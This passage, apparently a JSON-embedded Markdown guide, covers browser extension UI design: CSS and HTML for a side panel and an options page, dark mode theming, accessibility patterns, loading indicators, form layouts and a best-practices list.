color: #333;\n  background: #fff;\n}\n\n.panel {\n  display: flex;\n  flex-direction: column;\n  height: 100vh;\n}\n\n.panel-header {\n  display: flex;\n  align-items: center;\n  justify-content: space-between;\n  padding: 12px 16px;\n  border-bottom: 1px solid #e0e0e0;\n  flex-shrink: 0;\n}\n\n.tab-info {\n  display: flex;\n  align-items: center;\n  gap: 8px;\n  overflow: hidden;\n}\n\n.favicon {\n  width: 16px;\n  height: 16px;\n}\n\n.site-name {\n  font-weight: 500;\n  white-space: nowrap;\n  overflow: hidden;\n  text-overflow: ellipsis;\n}\n\n.panel-tabs {\n  display: flex;\n  border-bottom: 1px solid #e0e0e0;\n  flex-shrink: 0;\n}\n\n.tab {\n  flex: 1;\n  padding: 10px;\n  border: none;\n  background: none;\n  cursor: pointer;\n  font-size: 13px;\n  color: #666;\n  border-bottom: 2px solid transparent;\n  transition: all 0.2s;\n}\n\n.tab:hover {\n  color: #333;\n  background: #f5f5f5;\n}\n\n.tab.active {\n  color: #1a73e8;\n  border-bottom-color: #1a73e8;\n}\n\n.panel-content {\n  flex: 1;\n  overflow-y: auto;\n}\n\n.tab-content {\n  display: none;\n  padding: 16px;\n}\n\n.tab-content.active {\n  display: block;\n}\n\n.panel-footer {\n  padding: 8px 16px;\n  border-top: 1px solid #e0e0e0;\n  font-size: 12px;\n  color: #666;\n  flex-shrink: 0;\n}\n```\n\n---\n\n## Options Page\n\n### Options Structure\n\n```html\n<!-- options.html -->\n<!DOCTYPE html>\n<html>\n<head>\n  <meta charset=\"UTF-8\">\n  <title>Extension Settings</title>\n  <link rel=\"stylesheet\" href=\"options.css\">\n</head>\n<body>\n  <div class=\"options-container\">\n    <header class=\"options-header\">\n      <h1>Extension Settings</h1>\n    </header>\n\n    <main class=\"options-content\">\n      <section class=\"settings-group\">\n        <h2>General</h2>\n\n        <div class=\"setting-item\">\n          <div class=\"setting-info\">\n            <label for=\"autoSave\">Auto-save pages</label>\n            <p class=\"setting-description\">Automatically save pages when visiting</p>\n          </div>\n          <input type=\"checkbox\" id=\"autoSave\" class=\"toggle\">\n        </div>\n\n        <div class=\"setting-item\">\n          <div class=\"setting-info\">\n            <label for=\"theme\">Theme</label>\n          </div>\n          <select id=\"theme\" class=\"select\">\n            <option value=\"system\">System</option>\n            <option value=\"light\">Light</option>\n            <option value=\"dark\">Dark</option>\n          </select>\n        </div>\n      </section>\n\n      <section class=\"settings-group\">\n        <h2>Keyboard Shortcuts</h2>\n        <p class=\"section-description\">\n          Configure shortcuts in\n          <a href=\"chrome://extensions/shortcuts\" id=\"shortcuts-link\">\n            Chrome Extension Shortcuts\n          </a>\n        </p>\n      </section>\n\n      <section class=\"settings-group danger-zone\">\n        <h2>Danger Zone</h2>\n        <button id=\"clearData\" class=\"btn-danger\">Clear All Data</button>\n      </section>\n    </main>\n\n    <div id=\"toast\" class=\"toast hidden\">Settings saved</div>\n  </div>\n  <script src=\"options.js\"></script>\n</body>\n</html>\n```\n\n### Options Styles\n\n```css\n/* options.css */\nbody {\n  font-family: system-ui, -apple-system, sans-serif;\n  font-size: 14px;\n  color: #333;\n  background: #f5f5f5;\n  margin: 0;\n  padding: 20px;\n}\n\n.options-container {\n  max-width: 600px;\n  margin: 0 auto;\n}\n\n.options-header {\n  margin-bottom: 24px;\n}\n\n.options-header h1 {\n  font-size: 24px;\n  font-weight: 600;\n}\n\n.settings-group {\n  background: white;\n  border-radius: 8px;\n  padding: 20px;\n  margin-bottom: 16px;\n  box-shadow: 0 1px 3px rgba(0,0,0,0.1);\n}\n\n.settings-group h2 {\n  font-size: 16px;\n  font-weight: 600;\n  margin-bottom: 16px;\n  padding-bottom: 8px;\n  border-bottom: 1px solid #e0e0e0;\n}\n\n.setting-item {\n  display: flex;\n  justify-content: space-between;\n  align-items: center;\n  padding: 12px 0;\n  border-bottom: 1px solid #f0f0f0;\n}\n\n.setting-item:last-child {\n  border-bottom: none;\n}\n\n.setting-info {\n  flex: 1;\n}\n\n.setting-info label {\n  font-weight: 500;\n  cursor: pointer;\n}\n\n.setting-description {\n  font-size: 12px;\n  color: #666;\n  margin-top: 4px;\n}\n\n/* Toggle Switch */\n.toggle {\n  appearance: none;\n  width: 44px;\n  height: 24px;\n  background: #ccc;\n  border-radius: 12px;\n  position: relative;\n  cursor: pointer;\n  transition: background 0.2s;\n}\n\n.toggle::after {\n  content: '';\n  position: absolute;\n  top: 2px;\n  left: 2px;\n  width: 20px;\n  height: 20px;\n  background: white;\n  border-radius: 50%;\n  transition: transform 0.2s;\n}\n\n.toggle:checked {\n  background: #1a73e8;\n}\n\n.toggle:checked::after {\n  transform: translateX(20px);\n}\n\n/* Select */\n.select {\n  padding: 8px 12px;\n  border: 1px solid #ddd;\n  border-radius: 6px;\n  font-size: 14px;\n  min-width: 120px;\n}\n\n/* Danger Zone */\n.danger-zone {\n  border: 1px solid #ffcdd2;\n}\n\n.btn-danger {\n  background: #dc3545;\n  color: white;\n  border: none;\n  padding: 8px 16px;\n  border-radius: 6px;\n  cursor: pointer;\n}\n\n.btn-danger:hover {\n  background: #c82333;\n}\n\n/* Toast Notification */\n.toast {\n  position: fixed;\n  bottom: 20px;\n  left: 50%;\n  transform: translateX(-50%);\n  background: #333;\n  color: white;\n  padding: 12px 24px;\n  border-radius: 8px;\n  transition: opacity 0.3s;\n}\n\n.toast.hidden {\n  opacity: 0;\n  pointer-events: none;\n}\n```\n\n---\n\n## Dark Mode Support\n\n### CSS Variables Approach\n\n```css\n:root {\n  --bg-primary: #ffffff;\n  --bg-secondary: #f5f5f5;\n  --text-primary: #333333;\n  --text-secondary: #666666;\n  --border-color: #e0e0e0;\n  --accent-color: #1a73e8;\n}\n\n@media (prefers-color-scheme: dark) {\n  :root {\n    --bg-primary: #1e1e1e;\n    --bg-secondary: #2d2d2d;\n    --text-primary: #e0e0e0;\n    --text-secondary: #a0a0a0;\n    --border-color: #404040;\n    --accent-color: #8ab4f8;\n  }\n}\n\nbody {\n  background: var(--bg-primary);\n  color: var(--text-primary);\n}\n\n.card {\n  background: var(--bg-secondary);\n  border: 1px solid var(--border-color);\n}\n```\n\n### Manual Theme Toggle\n\n```javascript\n// options.js\nasync function applyTheme(theme) {\n  if (theme === 'system') {\n    document.documentElement.removeAttribute('data-theme');\n  } else {\n    document.documentElement.setAttribute('data-theme', theme);\n  }\n  await chrome.storage.sync.set({ theme });\n}\n\n// CSS\n[data-theme=\"dark\"] {\n  --bg-primary: #1e1e1e;\n  /* ... dark values */\n}\n\n[data-theme=\"light\"] {\n  --bg-primary: #ffffff;\n  /* ... light values */\n}\n```\n\n---\n\n## Accessibility\n\n### Focus Management\n\n```css\n/* Visible focus indicators */\nbutton:focus-visible,\ninput:focus-visible,\nselect:focus-visible {\n  outline: 2px solid var(--accent-color);\n  outline-offset: 2px;\n}\n\n/* Skip links for keyboard navigation */\n.skip-link {\n  position: absolute;\n  top: -40px;\n  left: 0;\n  background: var(--accent-color);\n  color: white;\n  padding: 8px;\n  z-index: 100;\n}\n\n.skip-link:focus {\n  top: 0;\n}\n```\n\n### ARIA Labels\n\n```html\n<!-- Icon-only buttons -->\n<button aria-label=\"Close\" class=\"close-btn\">×</button>\n<button aria-label=\"Settings\" class=\"icon-btn\">⚙️</button>\n\n<!-- Loading states -->\n<div aria-live=\"polite\" aria-busy=\"true\">\n  Loading...\n</div>\n\n<!-- Tabs -->\n<div role=\"tablist\">\n  <button role=\"tab\" aria-selected=\"true\" aria-controls=\"panel1\">Tab 1</button>\n  <button role=\"tab\" aria-selected=\"false\" aria-controls=\"panel2\">Tab 2</button>\n</div>\n<div role=\"tabpanel\" id=\"panel1\">Content 1</div>\n<div role=\"tabpanel\" id=\"panel2\" hidden>Content 2</div>\n```\n\n### Keyboard Navigation\n\n```javascript\n// Keyboard shortcuts\ndocument.addEventListener('keydown', (e) => {\n  // Escape to close\n  if (e.key === 'Escape') {\n    closeModal();\n  }\n\n  // Tab navigation in lists\n  if (e.key === 'ArrowDown' || e.key === 'ArrowUp') {\n    navigateList(e.key === 'ArrowDown' ? 1 : -1);\n    e.preventDefault();\n  }\n});\n\n// Trap focus in modals\nfunction trapFocus(element) {\n  const focusables = element.querySelectorAll(\n    'button, [href], input, select, textarea, [tabindex]:not([tabindex=\"-1\"])'\n  );\n  const first = focusables[0];\n  const last = focusables[focusables.length - 1];\n\n  element.addEventListener('keydown', (e) => {\n    if (e.key !== 'Tab') return;\n\n    if (e.shiftKey && document.activeElement === first) {\n      last.focus();\n      e.preventDefault();\n    } else if (!e.shiftKey && document.activeElement === last) {\n      first.focus();\n      e.preventDefault();\n    }\n  });\n}\n```\n\n---\n\n## Loading States\n\n```html\n<!-- Skeleton Loading -->\n<div class=\"skeleton-container\">\n  <div class=\"skeleton skeleton-text\"></div>\n  <div class=\"skeleton skeleton-text short\"></div>\n</div>\n\n<!-- Spinner -->\n<div class=\"spinner\"></div>\n\n<!-- Progress Bar -->\n<div class=\"progress-bar\">\n  <div class=\"progress-fill\" style=\"width: 60%\"></div>\n</div>\n```\n\n```css\n/* Skeleton */\n.skeleton {\n  background: linear-gradient(90deg, #f0f0f0 25%, #e0e0e0 50%, #f0f0f0 75%);\n  background-size: 200% 100%;\n  animation: shimmer 1.5s infinite;\n  border-radius: 4px;\n}\n\n.skeleton-text {\n  height: 16px;\n  margin-bottom: 8px;\n}\n\n.skeleton-text.short {\n  width: 60%;\n}\n\n@keyframes shimmer {\n  0% { background-position: 200% 0; }\n  100% { background-position: -200% 0; }\n}\n\n/* Spinner */\n.spinner {\n  width: 24px;\n  height: 24px;\n  border: 3px solid #f0f0f0;\n  border-top-color: var(--accent-color);\n  border-radius: 50%;\n  animation: spin 0.8s linear infinite;\n}\n\n@keyframes spin {\n  to { transform: rotate(360deg); }\n}\n\n/* Progress Bar */\n.progress-bar {\n  height: 4px;\n  background: #e0e0e0;\n  border-radius: 2px;\n  overflow: hidden;\n}\n\n.progress-fill {\n  height: 100%;\n  background: var(--accent-color);\n  transition: width 0.3s;\n}\n```\n\n---\n\n## Form Patterns\n\n```html\n<form class=\"form\" id=\"settingsForm\">\n  <div class=\"form-group\">\n    <label for=\"apiKey\">API Key</label>\n    <input type=\"password\" id=\"apiKey\" placeholder=\"Enter your API key\">\n    <p class=\"form-hint\">Get your key from the dashboard</p>\n  </div>\n\n  <div class=\"form-group\">\n    <label for=\"language\">Language</label>\n    <select id=\"language\">\n      <option value=\"en\">English</option>\n      <option value=\"es\">Spanish</option>\n    </select>\n  </div>\n\n  <div class=\"form-actions\">\n    <button type=\"button\" class=\"btn-secondary\">Cancel</button>\n    <button type=\"submit\" class=\"btn-primary\">Save</button>\n  </div>\n</form>\n```\n\n```css\n.form-group {\n  margin-bottom: 16px;\n}\n\n.form-group label {\n  display: block;\n  margin-bottom: 6px;\n  font-weight: 500;\n}\n\n.form-group input,\n.form-group select {\n  width: 100%;\n  padding: 10px 12px;\n  border: 1px solid var(--border-color);\n  border-radius: 6px;\n  font-size: 14px;\n}\n\n.form-group input:focus,\n.form-group select:focus {\n  border-color: var(--accent-color);\n  outline: none;\n}\n\n.form-hint {\n  font-size: 12px;\n  color: var(--text-secondary);\n  margin-top: 4px;\n}\n\n.form-actions {\n  display: flex;\n  gap: 8px;\n  justify-content: flex-end;\n  margin-top: 24px;\n}\n\n.btn-primary {\n  background: var(--accent-color);\n  color: white;\n  border: none;\n  padding: 10px 20px;\n  border-radius: 6px;\n  font-weight: 500;\n  cursor: pointer;\n}\n\n.btn-secondary {\n  background: transparent;\n  color: var(--text-primary);\n  border: 1px solid var(--border-color);\n  padding: 10px 20px;\n  border-radius: 6px;\n  cursor: pointer;\n}\n```\n\n---\n\n## Best Practices\n\n1. **Set explicit dimensions** - Prevent layout shifts\n2. **Use system fonts** - Faster loading, native feel\n3. **Support dark mode** - Match user preference\n4. **Test at different sizes** - Popup can be resized\n5. **Provide keyboard navigation** - Accessibility\n6. **Show loading states** - User feedback\n7. **Use CSS variables** - Easy theming\n8. **Minimize external resources** - Faster loading\n9. **Test with screen readers** - Full accessibility\n10. **Follow platform conventions** - Familiar patterns"
              }
            ]
          }
        ]
      }
    }
  ]
}